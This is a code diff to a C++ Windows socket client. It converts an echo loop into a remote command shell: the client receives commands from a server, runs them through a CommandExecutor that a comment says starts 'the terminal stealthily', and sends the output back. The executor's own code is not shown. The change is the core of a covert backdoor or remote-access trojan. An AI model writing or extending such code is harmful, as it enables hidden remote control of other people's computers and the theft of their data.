@@ -3,6 +3,7 @@
 #include <WS2tcpip.h>
 #include <iostream>
 #include <cstring>
+#include "CommandExecutor.h"
 
 using namespace std;
 
@@ -54,9 +55,11 @@ int main() {
 		cout << "Client: Can start sending and receiving data…" << endl;
 	}
 
-	char sendBuffer[200] = "\n";
-	char receiveBuffer[200] = "\n";
+	char sendBuffer[4096] = "\n"; // Buffer to hold data to send to the server
+	char receiveBuffer[200] = "\n"; // Buffer to hold commands received from the server
 	int byteCount = 0;
+
+	CommandExecutor cmdExecutor; // Initialize command executor and start the terminal stealthily
 
 	while (true) {
 		//RECEIVE DATA FROM SERVER
@@ -70,7 +73,11 @@ int main() {
 		printf("Received data : %s \n", receiveBuffer);
 
 		//SEND DATA TO SERVER (same as received message for now, will be replaced with command output)
-		strcpy_s(sendBuffer, receiveBuffer);
+		/*strcpy_s(sendBuffer, receiveBuffer);*/
+
+		// Execute the command received from the server, and send the result back
+		string result = cmdExecutor.executeCommand(receiveBuffer);
+		strcpy_s(sendBuffer, sizeof(sendBuffer), result.c_str());
 		byteCount = send(clientSocket, sendBuffer, strlen(sendBuffer), 0);
 		if (byteCount == SOCKET_ERROR) {
 			printf("Client: send failed, error %ld.\n", WSAGetLastError());
